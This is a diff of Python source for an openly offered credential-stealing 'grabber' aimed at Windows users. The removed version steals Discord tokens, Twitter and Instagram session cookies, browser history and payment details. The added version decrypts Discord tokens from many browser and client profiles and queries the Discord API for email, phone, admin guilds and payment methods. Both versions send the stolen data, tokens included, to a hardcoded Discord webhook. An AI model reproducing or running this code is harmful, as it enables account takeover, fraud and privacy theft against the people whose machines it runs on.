@@ -1,293 +1,213 @@
 import os
+if os.name != "nt":
+    exit()
+import subprocess
 import sys
-from json import loads
-from base64 import b64decode
-from sqlite3 import connect
-from shutil import copyfile
-from threading import Thread 
-from win32crypt import CryptUnprotectData
+import json
+import urllib.request
+import re
+import base64
+import datetime
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
 from Crypto.Cipher import AES
-from discord_webhook import DiscordEmbed, DiscordWebhook
-from subprocess import Popen, PIPE
-from urllib.request import urlopen, Request
-from requests import get
-from re import findall, search
-import win32con
-from win32api import SetFileAttributes, GetSystemMetrics
-import browser_cookie3
-from browser_history import get_history
-from prettytable import PrettyTable
-from platform import platform
-from getmac import get_mac_address as gma
-from psutil import virtual_memory
-from collections import defaultdict
-from zipfile import ZipFile, ZIP_DEFLATED
-from cpuinfo import get_cpu_info
-from multiprocessing import freeze_support
 
-website = ['discord.com', 'twitter.com', 'instagram.com']
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
 
-def get_hwid():
-    p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
 
-def get_user_data(tk):
-    headers = {'Authorization': tk}
-    response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
-    return [response['username'], response['discriminator'], response['email'], response['phone']]
+    if token:
+        headers.update({"Authorization": token})
 
-def has_payment_methods(tk):
-    headers = {'Authorization': tk}
-    response=get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
-    return response
+    return headers
 
-def cookies_grabber_mod(u):
-    cookies = []
-    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
-    for browser in browsers:
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
         try:
-            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
-        except:
-            pass
-    return cookies
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
 
-def get_Personal_data():
+    return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
+def getip():
     try:
-        ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
-        country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
-        city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
     except:
-        city="City not found -_-"
-        country="Country not found -_-"
-        ip_address="No IP found -_-"
-    return [ip_address, country, city]
-
-def find_His():
-    table = PrettyTable(padding_width=1)
-    table.field_names = ["CurrentTime", "Link"]
-    for his in get_history().histories:
-        a, b = his
-        if len(b) <= 100:
-            table.add_row([a, b])
-        else:
-            x_= b.split("//")
-            x__, x___= x_[1].count('/'), x_[1].split('/')
-            if x___[0] != 'www.google.com':
-                if x__ <= 5:
-                    b = f"{x_[0]}//"
-                    for p in x___:
-                        if x___.index(p) != len(x___) - 1:
-                            b += f"{p}/"
-                    if len(b) <= 100:
-                        table.add_row([a, b])
-                    else:
-                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
-                else:
-                    b = f"{x_[0]}//{x___[0]}/[...]"
-                    if len(b) <= 100:
-                        table.add_row([a, b]) 
-                    else:
-                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
-    return table.get_string()
-
-def get_encryption_key():
-    local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                    "AppData", "Local", "Google", "Chrome",
-                                    "User Data", "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = f.read()
-        local_state = loads(local_state)
-    key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    key = key[5:]
-    return CryptUnprotectData(key, None, None, None, 0)[1]
-
-def decrypt_data(data, key):
-    try:
-        iv = data[3:15]
-        data = data[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt(data)[:-16].decode()
-    except:
-        try:
-            return str(CryptUnprotectData(data, None, None, None, 0)[1])
-        except:
-            return ""
+        return "None"
 
 def main():
-    filename = "Cookies.db"
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
-    if not os.path.isfile(filename):
-        copyfile(db_path, filename)
-        SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
-    db = connect(filename)
-    db.text_factory = lambda b: b.decode(errors="ignore")
-    for w in website:
-        if w == website[0]:
-            tokens = []
-            def discord_tokens(path):
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                            for token in findall(regex, line):
-                                if token not in tokens:
-                                    tokens.append(token)
-            paths = [
-                os.path.join(os.getenv('LOCALAPPDATA'),"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-                os.path.join(os.getenv('APPDATA'), "Discord", "Local Storage", "leveldb"),
-                os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),
-                os.path.join(os.getenv('APPDATA'), "discordptb"),
-                os.path.join(os.getenv('APPDATA'), "discordcanary"),
-                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
-                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data", "Default")
-            ]
-            threads = []
-            def find_wb(wb):
-                if os.path.exists(wb):
-                    threads.append(Thread(target=discord_tokens, args=(wb,)))
-            for j in paths:
-                find_wb(j)
-            for t in threads:
-                t.start()
-                t.join()
-        elif w == website[1]:
-            t_cookies, t_lst = ([] for _ in range(2))
-            for b in cookies_grabber_mod(w):
-                t_cookies.append(b.split(', '))
-            for c in t_cookies:
-                for y in c:
-                    if search(r"auth_token", y) != None:
-                        t_lst.append(y.split(' ')[1].split("=")[1])
-        elif w == website[2]:
-            insta_cookies, insta_lst = ([] for _ in range(2))
-            for b in cookies_grabber_mod(w):
-                insta_cookies.append(b.split(', '))
-            browser_ = defaultdict(dict)
-            for c in insta_cookies:
-                if all([search(r"ds_user_id", str(c))!=None, search(r"sessionid", str(c))!=None]):
-                    for y in c:
-                        conditions = [search(r"ds_user_id", y)!=None, search(r"sessionid", y)!=None]
-                        if any(conditions):
-                            browser_[insta_cookies.index(c)][conditions.index(True)] = y.split(' ')[1].split("=")[1]
-            for x in list(dict(browser_).keys()):
-                insta_lst.append(list(dict(browser_)[x].items()))
-            for x in insta_lst:
-                for y in x:
-                    if x.index(y) != y[0]:
-                        x[x.index(y)], x[y[0]] = x[y[0]], x[x.index(y)]
-            for x in insta_lst:
-                for y in x:
-                    x[x.index(y)] = y[1]
-    for x in tokens:
-        all_data_p, lst_b = [] ,has_payment_methods(x)
-        try:
-            for n in range(len(lst_b)):
-                if lst_b[n]['type'] == 1:
-                    writable = [lst_b[n]['brand'], lst_b[n]['type'], lst_b[n]['last_4'], lst_b[n]['expires_month'], lst_b[n]['expires_year'], lst_b[n]['billing_address']]
-                    if writable not in all_data_p:
-                        all_data_p.append(writable)
-                elif lst_b[n]['type'] == 2:
-                    writable_2 = [lst_b[n]['email'], lst_b[n]['type'], lst_b[n]['billing_address']]
-                    if writable_2 not in all_data_p:
-                        all_data_p.append(writable_2)
-        except:
-            pass
-    db.commit()
-    db.close()
-    try:
-        os.remove('Cookies.db')
-    except:
-        pass
-    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p]
+    checked = []
 
-def replace_new(path):
-    if os.path.exists(path):
-        os.remove(path)
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
 
-def send_webhook(DISCORD_WEBHOOK_URLs):
-    p_lst = get_Personal_data()
-    cpuinfo = get_cpu_info()
-    main_info = main()
-    discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
-    discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], []
-    for t_ in main_info[0]:
-        try:
-            lst = get_user_data(t_)
-            username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
-            discord_T.add_row([t_, username, email, phone])
-            verified_tokens.append(t_)
-        except:
-            pass
-    for _t in main_info[1]:
-        twitter_T.add_row([_t])
-    for _t_ in main_info[2]:
-        insta_T.add_row(_t_)
-    pay_l = []
-    for _p in main_info[3]:
-        if _p[1] == 1:
-            payment_card = PrettyTable(padding_width=1)
-            payment_card.field_names = ["Brand", "Last 4","Type", "Expiration", "Billing Adress"]
-            payment_card.add_row([_p[0], _p[2], "Debit or Credit Card", f"{_p[3]}/{_p[4]}", _p[5]])
-            pay_l.append(payment_card.get_string())
-        elif _p[1] == 2:
-            payment_p = PrettyTable(padding_width=1)
-            payment_p.field_names = ["Email", "Type", "Billing Adress"]
-            payment_p.add_row([_p[0], "Paypal", _p[2]])
-            pay_l.append(payment_p.get_string())
-    files_names = [["Discord Tokens.txt", discord_T], ["Twitter Tokens.txt", twitter_T], ["Instagram Tokens.txt", insta_T]]
-    for x_, y_ in files_names:
-        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0) or (y_ == files_names[3][1] and len(main_info[4])!=0):
-            replace_new(x_)
-            with open(x_, 'w') as wr:
-                SetFileAttributes(x_, win32con.FILE_ATTRIBUTE_HIDDEN)
-                wr.write(y_.get_string())
-    replace_new("data.zip")
-    with ZipFile("data.zip", mode='w', compression=ZIP_DEFLATED) as zip:
-        SetFileAttributes("data.zip", win32con.FILE_ATTRIBUTE_HIDDEN)
-        if ('payment_card' or 'payment_p') in locals():
-            replace_new("Payment Info.txt")
-            with open("Payment Info.txt", 'w') as f:
-                SetFileAttributes("Payment Info.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
-                for i in pay_l:
-                    f.write(f"{i}\n")
-            zip.write("Payment Info.txt")
-            os.remove("Payment Info.txt")
-        replace_new("History.txt")
-        with open('History.txt', 'w') as f:
-            SetFileAttributes("History.txt", win32con.FILE_ATTRIBUTE_HIDDEN), f.write(find_His())
-        zip.write("History.txt")
-        os.remove("History.txt")
-        for name_f, _ in files_names:
-            if os.path.exists(name_f):
-                zip.write(name_f)
-                os.remove(name_f)
-    for URL in DISCORD_WEBHOOK_URLs:
-        webhook = DiscordWebhook(url=URL, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
-        embed = DiscordEmbed(title='Cooked Grabber', color='00FF00')
-        embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
-        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get('https://restcountries.com/v3/name/morocco').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
-        embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
-        embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
-        card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
-        embed.add_embed_field(name='PAYMENT INFO FOUNDED', value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}", inline=False)
-        embed.set_author(
-            name="H4X0R-TEAM",
-            url="https://github.com/h4x0r-project"
-        )
-        embed.set_footer(text='By Lemon.-_-.#3714 & cr4sh3d.py#2160')
-        embed.set_timestamp()
-        with open("data.zip", 'rb') as f:
-            webhook.add_file(file=f.read(), filename=f"Cooked-Grabber-{os.getenv('UserName')}.zip")
-        webhook.add_embed(embed)
-        webhook.execute()
-    os.remove("data.zip")
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1455936662994555092/aw2YyI_G_FyWotyTymH03kvqUfgDb5wWmhm4Mppt2e6jT3hb9EsElE9r-BNEO4HA_De7', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
 
 if __name__ == "__main__":
-    freeze_support()
-    if len(sys.argv) == 1:
-        send_webhook(['https://discord.com/api/webhooks/1455936662994555092/aw2YyI_G_FyWotyTymH03kvqUfgDb5wWmhm4Mppt2e6jT3hb9EsElE9r-BNEO4HA_De7'])
-    else:
-        del sys.argv[0]
-        send_webhook(sys.argv)
+    main()
